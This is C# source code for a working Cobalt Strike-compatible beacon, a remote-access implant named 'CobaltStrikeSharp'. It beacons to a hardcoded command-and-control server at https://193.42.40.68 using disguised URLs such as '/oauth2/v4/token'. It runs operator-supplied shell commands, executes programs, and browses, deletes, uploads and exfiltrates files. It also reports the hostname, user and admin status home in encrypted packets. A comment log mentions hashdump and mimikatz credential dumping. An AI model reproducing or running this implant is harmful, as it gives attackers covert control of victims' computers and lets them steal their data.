using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;


namespace CobaltStrikeSharp
{
    class Protocol
    {
        [Serializable]  //  指示可序列化 
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public class OSInfo
        {
            [MarshalAs(UnmanagedType.U4)]
            public UInt32 clientID;

            [MarshalAs(UnmanagedType.U4)]
            public UInt32 processID;

            [MarshalAs(UnmanagedType.U2)]
            public UInt16 sshPort = 0;

            [MarshalAs(UnmanagedType.U1)]
            public byte flag;

            [MarshalAs(UnmanagedType.U1)]
            public byte majorVer;

            [MarshalAs(UnmanagedType.U1)]
            public byte minorVer;

            [MarshalAs(UnmanagedType.U2)]
            public UInt16 build;

            [MarshalAs(UnmanagedType.U4)]
            public UInt32 ptr = 0;

            [MarshalAs(UnmanagedType.U4)]
            public UInt32 ptrGMH = 0;

            [MarshalAs(UnmanagedType.U4)]
            public UInt32 ptrGPA = 0;

            [MarshalAs(UnmanagedType.U4)]
            public UInt32 localIP;
        };

        private static byte[] GlobalKey;
        private static bool  isInit = false;
        public static UInt32 ClientID;
        public static int sleepTime = 1*1000;
        public static String WorkingDirectory;

        private enum CMD_TYPE
        {     
            CMD_TYPE_EXIT = 3,
            CMD_TYPE_SLEEP = 4,
            CMD_TYPE_CD = 5,
            CMD_TYPE_UPLOAD_START = 0xa,
            CMD_TYPE_DOWNLOAD = 0xb,
            CMD_TYPE_EXECUTE = 0xc,
            CMD_TYPE_PROCESSLIST = 0x20,
            CMD_TYPE_PWD = 0x27,
            CMD_TYPE_RUNDLL = 0x28,  //运行dll，这个一般是在加载DLL后面跟着的，一般是打包在了一个数据包中
            CMD_TYPE_LOADDLL = 0x2c, //加载dll，需要先修补
            CMD_TYPE_FILE_BROWSE = 0x35,
            CMD_TYPE_MAKE_DIR = 0x36,
            CMD_TYPE_LIST_DRIVER = 0x37,
            CMD_TYPE_DELETE_FILE = 0x38,
            CMD_TYPE_UPLOAD_LOOP = 0x43,


            CMD_TYPE_SHELL = 0x4e,
            CMD_TYPE_SCREENSHOT = 0x65,

            /*
            beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 82541 bytes
[-] DEBUG: The Message Type [44] is not support!
[-] DEBUG: The Message Type [40] is not support!
beacon> logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 296058 bytes
[-] DEBUG: The Message Type [44] is not support!
[-] DEBUG: The Message Type [40] is not support!
beacon> screenshot
[*] Tasked beacon to take screenshot
[+] host called home, sent: 199779 bytes
[-] DEBUG: The Message Type [44] is not support!
[-] DEBUG: The Message Type [101] is not support!
beacon> screenshot
[*] Tasked beacon to take screenshot
[+] host called home, sent: 199779 bytes
[-] DEBUG: The Message Type [44] is not support!
[-] DEBUG: The Message Type [101] is not support!
*/
        };

        private enum REPLY_TYPE
        {
            SHELL = 0,
            INFO = 0,
            DOWNLOAD_FILEINFO = 2,
            DOWNLOAD_ING = 8,
            DOWNLOAD_OK = 9,
            FILE_BROWSE = 22,
            LIST_DRIVER = 22,
            ERROR = 31,
        };

        private static UInt32 Counter = 0;

        //public static String GETURL = "/activity";
        public static String GETURL = "/service/json";
        
        //public static String POSTURL = "/submit.php?id=";
        public static String POSTURL = "/oauth2/v4/token";
        public static String CSSERVER = "https://193.42.40.68";
        
        public static void init()
        {
            //每个进程的这个需要固定，是后面加解密的密钥
            if (!isInit)
            {
                GlobalKey = new byte[16];
                //Random rnd = new Random();
                //rnd.NextBytes(GlobalKey);
                for (int i = 0; i < 16; i++)
                {
                    GlobalKey[i] = (byte)i;
                }

                byte[] hash = Util.getSha256(GlobalKey);
                //String strAESKey = strhash.Substring(0, 16);
                //String strHmacKey = strhash.Substring(16);
                //这里生成AES的密钥，要放到加密类中
                Array.Copy(hash, 0, Crypto.Key, 0, 16);
                Crypto.HMACKey = new byte[hash.Length - 16];
                Array.Copy(hash, 16, Crypto.HMACKey, 0, hash.Length - 16);
                while (true)
                {
                    ClientID = (UInt32)(new Random()).Next(903300000, 903400000);
                    if (ClientID % 2 == 0)
                    {
                        break;
                    }
                }
                

                WorkingDirectory = System.IO.Directory.GetCurrentDirectory();

                isInit = true;
            }
        }

       

        /*
        0x000001F13DB34F68  00 00 be ef 00 00 00 45 be 13 f5 e0 4b 1f 9b de  ..??...E?.??K.??
        0x000001F13DB34F78  46 5b 2b dc 32 08 aa e5 a8 03 a8 03 35 d8 43 92  F[+?2.???.?.5?C?
                                                                ___________
													            clientid
        0x000001F13DB34F88  00 00 3d 88 00 00 04 06 02 23 f0 00 00 00 00 74  ..=?.....#?....t
                            ___________ _____ __
					        processid   sshP flag
        0x000001F13DB34F98  ff 88 e0 74 ff 62 d0 01 01 01 0b 51 41 58 09 74  .??t.b?....QAX.t
        0x000001F13DB34FA8  6f 6d 09 62 65 61 63 6f 6e 2e 65 78 65 00 00 00  om.beacon.exe...
        */



        public static void parsePkg(byte[] pkg)
        {
            //0-4    时间戳
            //4-8    包长度（从这个字段结束往后还有多长）
            //8-12   命令类型  |- 可重复的块
            //12-16  命令长度  |- 可重复的块
            //....   命令数据  |- 可重复的块

            Array.Reverse(pkg, 4, 4);
            
            UInt32 pkg_len = BitConverter.ToUInt32(pkg, 4);     
           
            int curPos = 0;
            /*
            0x000001F4B03F6F40  60 e6 2f a2 25 00 00 00 4e 00 00 00 1d 00 00 00  `?/?%...N.......
            0x000001F4B03F6F50  00 00 00 09 25 43 4f 4d 53 50 45 43 25 00 00 00  ....%COMSPEC%...
            0x000001F4B03F6F60  0a 20 2f 43 20 77 68 6f 61 6d 69 00 00 41 41 41  . /C whoami..AAA
            0x000001F4B03F6F70  00 00 00 00 00 00 00 00 a0 aa c2 d1 f9 7f 00 00  ........?????...
            */
            while(curPos < pkg_len)
            {
                Array.Reverse(pkg, 8 + curPos, 4);
                UInt32 cmd_type = BitConverter.ToUInt32(pkg, 8 + curPos);
                Console.WriteLine(cmd_type);

                Array.Reverse(pkg, 12 + curPos, 4);
                UInt32 cmd_len = BitConverter.ToUInt32(pkg, 12 + curPos);
         
                byte[] data = new byte[cmd_len];
                Array.Copy(pkg, 16 + curPos, data, 0, cmd_len);
                //这里的data已经去掉了类型和长度
                //一个任务包里面的构造一般是
                //00 00 00 xx 任务类型
                //00 00 00 xx 任务包后续长度
                //00 00 00 xx 请求ID
                //00 00 00 xx 参数长度

                switch (cmd_type)
                {
                    case (UInt32)CMD_TYPE.CMD_TYPE_SHELL:
                        (new Thread(() => parseShell(data))).Start();
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_FILE_BROWSE:
                        (new Thread(() => parseFileBrowse(data))).Start();
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_MAKE_DIR:
                        (new Thread(() => parseMakeDir(data))).Start();
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_EXECUTE:
                        (new Thread(() => parseExecute(data))).Start();
                        break;                        
                    case (UInt32)CMD_TYPE.CMD_TYPE_DELETE_FILE:
                        (new Thread(() => parseDeleteFile(data))).Start();
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_LIST_DRIVER:
                        (new Thread(() => parseListDriver(data))).Start();
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_UPLOAD_START:
                        //不能多线程，下载的文件会乱
                        parseUploadStart(data);
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_UPLOAD_LOOP:
                        //不能多线程，下载的文件会乱
                        parseUploadLoop(data);
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_DOWNLOAD:
                        (new Thread(() => parseDownload(data))).Start();
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_CD:
                        WorkingDirectory = Encoding.Default.GetString(data);
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_SLEEP:
                        Array.Reverse(data, 0, 4);
                        int tmp = BitConverter.ToInt32(data, 0);
                        sleepTime = tmp;
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_PWD:
                        //(new Thread(() => parseUploadStart(data))).Start();
                        break;
                    case (UInt32)CMD_TYPE.CMD_TYPE_EXIT:
                        break;
                    default:
                        String infomation = String.Format("The Message Type [{0}] is not support!", cmd_type);
                        List <byte[]> metaInfo = new List<byte[]>();
                        metaInfo.Add(Util.toBigEndian((UInt32)0));
                        metaInfo.Add(Util.toBigEndian((UInt32)0));
                        metaInfo.Add(Util.toBigEndian((UInt32)0));
                        metaInfo.Add(Encoding.Default.GetBytes(infomation));
                        byte[] bmeta =  Util.BytesCombine(metaInfo);
                        byte[] bmetapkg = MakePacket((UInt32)REPLY_TYPE.ERROR, bmeta);
                        Request.doPost(Protocol.CSSERVER + Protocol.POSTURL + Protocol.ClientID.ToString(), null, bmetapkg);
                        break;
                }
                curPos += (int)cmd_len + 8; //8=headerlen
            }

        }

        public static void parseDownload(byte[] data)
        {
            String todownload = Encoding.Default.GetString(data);
            if (!File.Exists(todownload))
            {
                String result = String.Format("The download file [{0}] not exists", todownload);
                byte[] bpkg = MakePacket((UInt32)REPLY_TYPE.INFO, Encoding.Default.GetBytes(result));
                Request.doPost(Protocol.CSSERVER + Protocol.POSTURL + Protocol.ClientID.ToString(), null, bpkg);
                return;
            }
            //第一步上传文件大小信息
            FileInfo fi = new FileInfo(todownload);
            UInt32 fileLen = (UInt32)fi.Length;
            UInt32 requestID = (UInt32)new Random().Next(10000, 99999);
            List<byte[]> metaInfo = new List<byte[]>();
            metaInfo.Add(Util.toBigEndian((UInt32)requestID));
            metaInfo.Add(Util.toBigEndian((UInt32)fileLen));
            metaInfo.Add(Encoding.Default.GetBytes(todownload));
            byte[] bmetainfo = Util.BytesCombine(metaInfo);
            byte[] bmetainfopkg = MakePacket((UInt32)REPLY_TYPE.DOWNLOAD_FILEINFO, bmetainfo);
            Request.doPost(Protocol.CSSERVER + Protocol.POSTURL + Protocol.ClientID.ToString(), null, bmetainfopkg);
            //第二步开始发送数据，一次512KB
            using (BinaryReader br = new BinaryReader(new FileStream(todownload, FileMode.Open, System.IO.FileAccess.Read, FileShare.ReadWrite)))
            {
                while (true)
                {
                    byte[] readed = br.ReadBytes(400 * 1024);
                    if (readed.Length == 0)
                    {
                        break;
                    }
                    List<byte[]> downloading = new List<byte[]>();
                    downloading.Add(Util.toBigEndian((UInt32)requestID));
                    downloading.Add(readed);
                    byte[] bdownloading = Util.BytesCombine(downloading);
                    byte[] bdownloadingpkg = MakePacket((UInt32)REPLY_TYPE.DOWNLOAD_ING, bdownloading);
                    Request.doPost(Protocol.CSSERVER + Protocol.POSTURL + Protocol.ClientID.ToString(), null, bdownloadingpkg);
                }
            }                
            
            //第三部，发送下载完成         
            byte[] bok = Util.toBigEndian((UInt32)requestID);
            byte[] bokpkg = MakePacket((UInt32)REPLY_TYPE.DOWNLOAD_OK, bok);
            Request.doPost(Protocol.CSSERVER + Protocol.POSTURL + Protocol.ClientID.ToString(), null, bokpkg);
        }

        public static void parseExecute(byte[] data)
        {
            String toexeccute = Encoding.Default.GetString(data);
            String result = Util.execCmd("", toexeccute);
            byte[] bpkg = MakePacket((UInt32)REPLY_TYPE.INFO, Encoding.Default.GetBytes(result));
            Request.doPost(Protocol.CSSERVER + Protocol.POSTURL + Protocol.ClientID.ToString(), null, bpkg);
        }
        
        public static void parseDeleteFile(byte[] data)
        {
            String todelete = Encoding.Default.GetString(data);
            File.Delete(todelete);
        }
        public static void parseMakeDir(byte[] data)
        {
            String tomake = Encoding.Default.GetString(data);
            Directory.CreateDirectory(tomake);
        }
        public static void parseListDriver(byte[] data)
        {
            Array.Reverse(data, 0, 4);
            int requestID = BitConverter.ToInt32(data, 0);

            DriveInfo[] allDirves = DriveInfo.GetDrives();
            UInt32 driverFlag = 0;
            foreach (DriveInfo item in allDirves)
            {
                if (item.DriveType == DriveType.Fixed || item.DriveType == DriveType.Network || item.DriveType == DriveType.Removable)
                {
                    int pos = Encoding.ASCII.GetBytes(item.Name.ToLower())[0] - 97;
                    driverFlag |= (UInt32)Math.Pow(2, pos);
                }
            }            
            driverFlag = Convert.ToUInt32(Convert.ToString(driverFlag, 2).TrimStart('0'), 2);
            String tmp = driverFlag.ToString();
            
            driverFlag = BitConverter.ToUInt32(Util.toBigEndian(driverFlag), 0);
            List<byte[]> metaInfo = new List<byte[]>();
            metaInfo.Add(Util.toBigEndian((UInt32)requestID));
            metaInfo.Add(Encoding.ASCII.GetBytes(tmp));
            byte[] bpkg = MakePacket((UInt32)REPLY_TYPE.LIST_DRIVER, Util.BytesCombine(metaInfo));
            Request.doPost(Protocol.CSSERVER + Protocol.POSTURL + Protocol.ClientID.ToString(), null, bpkg);
        }

        public static void parseUploadStart(byte[] data)
        {
            Array.Reverse(data, 0, 4);
            int path_len = BitConverter.ToInt32(data, 0);
            String path = Encoding.Default.GetString(data, 4, path_len);
            byte[] bdata = new byte[data.Length - 4 - path_len];
            Array.Copy(data, 4 + path_len, bdata, 0, data.Length - 4 - path_len);
            FileStream fs;
            fs = new FileStream(path, FileMode.Append, FileAccess.Write);
            BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(bdata);
            bw.Close();
            fs.Close();
        }

        public static void parseUploadLoop(byte[] data)
        {
            parseUploadStart(data);
        }


        public static void parseFileBrowse(byte[] data)
        {
            Array.Reverse(data, 0, 4);
            Array.Reverse(data, 4, 4);
            int requestID = BitConverter.ToInt32(data, 0);
            int path_len = BitConverter.ToInt32(data, 4);
            String path = Encoding.Default.GetString(data, 8, path_len);
            // build string for result
            /*
               /Users/xxxx/Desktop/dev/deacon/*
               D       0       25/07/2020 09:50:23     .
               D       0       25/07/2020 09:50:23     ..
               D       0       09/06/2020 00:55:03     cmd
               D       0       20/06/2020 09:00:52     obj
               D       0       18/06/2020 09:51:04     Util
               D       0       09/06/2020 00:54:59     bin
               D       0       18/06/2020 05:15:12     config
               D       0       18/06/2020 13:48:07     crypt
               D       0       18/06/2020 06:11:19     Sysinfo
               D       0       18/06/2020 04:30:15     .vscode
               D       0       19/06/2020 06:31:58     packet
               F       272     20/06/2020 08:52:42     deacon.csproj
               F       6106    26/07/2020 04:08:54     Program.cs
            */
                        StringBuilder sb = new StringBuilder();
            if (path == ".\\*")
            {
                path = System.IO.Directory.GetCurrentDirectory()+"\\*";
            }
            sb.Append(path);
            DirectoryInfo dir = new DirectoryInfo(path.Trim('*'));
            sb.Append(String.Format("\nD\t0\t{0}\t.", dir.LastWriteTime.ToString("dd/MM/yyyy HH:mm:ss")));
            sb.Append(String.Format("\nD\t0\t{0}\t..", dir.LastWriteTime.ToString("dd/MM/yyyy HH:mm:ss")));
            
            foreach (DirectoryInfo di in dir.GetDirectories())
            {
                sb.Append(String.Format("\nD\t0\t{0}\t{1}", di.LastWriteTime.ToString("dd/MM/yyyy HH:mm:ss"), di.Name));
            }
            foreach (FileInfo fi in dir.GetFiles())
            {
                sb.Append(String.Format("\nD\t0\t{0}\t{1}", fi.LastWriteTime.ToString("dd/MM/yyyy HH:mm:ss"), fi.Name));
            }
            
            List<byte[]> metaInfo = new List<byte[]>();
            metaInfo.Add(Util.toBigEndian((UInt32)requestID));
            metaInfo.Add(Encoding.Default.GetBytes(sb.ToString()));
            byte[] bpkg = MakePacket((UInt32)REPLY_TYPE.FILE_BROWSE, Util.BytesCombine(metaInfo));
            Request.doPost(Protocol.CSSERVER + Protocol.POSTURL + Protocol.ClientID.ToString(), null, bpkg);
        }


        public static void parseShell(byte[] data)
        {
            //0-4 进程EXE路径长度
            //?-? 命令长度
            Array.Reverse(data, 0, 4);
            int path_len = BitConverter.ToInt32(data, 0);
            Array.Reverse(data, path_len+4, 4);
            int command_len = BitConverter.ToInt32(data, path_len + 4);
            String workpath = Encoding.Default.GetString(data, 4, path_len);
            String command = Encoding.Default.GetString(data, path_len + 4 + 4, command_len);
            Console.WriteLine(workpath);
            Console.WriteLine(command);
            String result = Util.execCmd(workpath, command);
            byte [] bpkg = MakePacket((UInt32)REPLY_TYPE.SHELL, Encoding.Default.GetBytes(result));
            Request.doPost(Protocol.CSSERVER + Protocol.POSTURL + Protocol.ClientID.ToString(), null, bpkg);
        }

        /// <summary>
        /// 上线心跳包
        /// </summary>
        /// <returns></returns>
        public static byte[] MakeMetaInfo()
        {
            /*
           MetaData for 4.1
               Key(16) | Charset1(2) | Charset2(2) |
               ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
               InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
           */

            OSInfo os = new OSInfo();
            os.clientID = BitConverter.ToUInt32(Util.toBigEndian((UInt32)ClientID), 0);
            os.processID = BitConverter.ToUInt32(Util.toBigEndian((UInt32)22961), 0);
            /* for is X64 OS, is X64 Process, is ADMIN */
	        byte METADATA_FLAG_NOTHING = 1;
	        byte METADATA_FLAG_X64_AGENT = 2;
	        byte METADATA_FLAG_X64_SYSTEM = 4;
	        byte METADATA_FLAG_ADMIN = 8;
	        
            os.flag = (byte)(METADATA_FLAG_X64_SYSTEM | METADATA_FLAG_X64_AGENT);
            if (Util.IsAdministrator())
            {
                os.flag = (byte)(METADATA_FLAG_ADMIN | os.flag);
            }
            os.majorVer = 6;
            os.minorVer = 2;
            os.build = BitConverter.ToUInt16(Util.toBigEndian((UInt16)9200), 0);
            os.localIP = 0x01010101;

            NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
            int i = 0;
            foreach (NetworkInterface adapter in adapters)
            {
                IPInterfaceProperties adapterProperties = adapter.GetIPProperties();
                UnicastIPAddressInformationCollection allAddress = adapterProperties.UnicastAddresses;
                if (allAddress.Count > 0)
                {
                    foreach (UnicastIPAddressInformation addr in allAddress)
                    {
                        if (os.localIP != 0x01010101)
                        {
                            break;
                        }
                        if (addr.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            if (addr.Address.Address != 0x0101017f)
                            {
                                os.localIP = BitConverter.ToUInt32(Util.toBigEndian((UInt32)addr.Address.Address), 0);
                                break;
                            }      
                        }
                    }
                }
            }
            int size = Marshal.SizeOf(typeof(OSInfo));

            IntPtr buffer = Marshal.AllocCoTaskMem(size);
            Marshal.StructureToPtr(os, buffer, false);

            byte[] pOSinfo = new byte[size];
            Marshal.Copy(buffer, pOSinfo, 0, size);

            Process cur = Process.GetCurrentProcess();

            String hostName = System.Net.Dns.GetHostName();
            String currentUser = System.Environment.UserName;
            String processName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            processName = processName.Substring(processName.LastIndexOf('\\') + 1);
            String userinfo = String.Format("{0}\t{1}\t{2}", hostName, currentUser, processName);
            byte[] pUserinfo = Encoding.Default.GetBytes(userinfo);

            UInt16 localeANSI = 936;
            UInt16 localeOEM = 936;
            UInt32 magicNum = 0xBEEF;

            List<byte[]> metaInfo = new List<byte[]>();
            metaInfo.Add(GlobalKey);
            metaInfo.Add(BitConverter.GetBytes(localeANSI));
            metaInfo.Add(BitConverter.GetBytes(localeOEM));
            metaInfo.Add(pOSinfo);
            metaInfo.Add(pUserinfo);

            byte[] metaInfo_b = Util.BytesCombine(metaInfo);
            UInt32 metaInfoLen = (UInt32)metaInfo_b.Length;

            List<byte[]> metaData = new List<byte[]>();
            metaData.Add(Util.toBigEndian(BitConverter.GetBytes(magicNum)));
            metaData.Add(Util.toBigEndian(BitConverter.GetBytes(metaInfoLen)));
            metaData.Add(metaInfo_b);

            byte[] metaData_b = Util.BytesCombine(metaData);

            return metaData_b;
        }

        public static byte[] MakePacket(UInt32 replyType, byte[] data_src, bool isPaddingZero = true)
        {
            //Counter
            //Datelen
            //DateType
            Counter += 1;
            //add 0 to data
            byte[] data;
            if (isPaddingZero)
            {
                byte[] bZero = { 0, 0, 0, 0 };
                List<byte[]> metaData = new List<byte[]>();
                metaData.Add(data_src);
                metaData.Add(bZero);
                data = Util.BytesCombine(metaData);
            }
            else
            {
                data = data_src;
            }
            

            UInt32 HMACLEN = 16;
            byte[] bcounter = Util.toBigEndian((UInt32)Counter);
            byte[] bdatalen = Util.toBigEndian((UInt32)data.Length);
            byte[] bdatatype = Util.toBigEndian((UInt32)replyType);
            List<byte[]> plainPkg = new List<byte[]>();
            plainPkg.Add(bcounter);
            plainPkg.Add(bdatalen);
            plainPkg.Add(bdatatype);
            plainPkg.Add(data);

            byte[] bplainPkg = Util.BytesCombine(plainPkg);
            byte[] bencryptPkg = Crypto.AESEncrypt(bplainPkg);
            byte[] bencryptLen = Util.toBigEndian((UInt32)bencryptPkg.Length + HMACLEN);
            byte[] bhmac = Crypto.getHMAC(bencryptPkg);
            List<byte[]> encryptPkg = new List<byte[]>();
            encryptPkg.Add(bencryptLen);
            encryptPkg.Add(bencryptPkg);
            encryptPkg.Add(bhmac);
            return Util.BytesCombine(encryptPkg);
        }

        public static void run()
        {
            while (true)
            {
                byte[] x = Protocol.MakeMetaInfo();
                String a = "D=A"+Crypto.RSAEncrypt(x);
                Dictionary<string, string> cookie = new Dictionary<string, string>();
                cookie.Add(HttpRequestHeader.Cookie.ToString(), a);
                byte[] result = Request.doGet(Protocol.CSSERVER + Protocol.GETURL, cookie);
                if (result.Length > 0)
                {
                    byte[] tmp = new byte[result.Length - 16];
                    Array.Copy(result, 0, tmp, 0, result.Length - 16);
                    byte[] b = Crypto.AESDecrypt(tmp);
                    //hmacHash:= resp.Bytes()[totalLen - crypt.HmacHashLen:]
                    //fmt.Printf("hmac hash: %v\n", hmacHash)
                    //通过signatrue计算数据包是否正确 todo
                    //如果解密都出错，那肯定不是正确的数据包，解密成功了，也就没有必要去校验hmac了
                    Protocol.parsePkg(b);
                }
                System.Threading.Thread.Sleep(Protocol.sleepTime);
            }
        }
    }
}
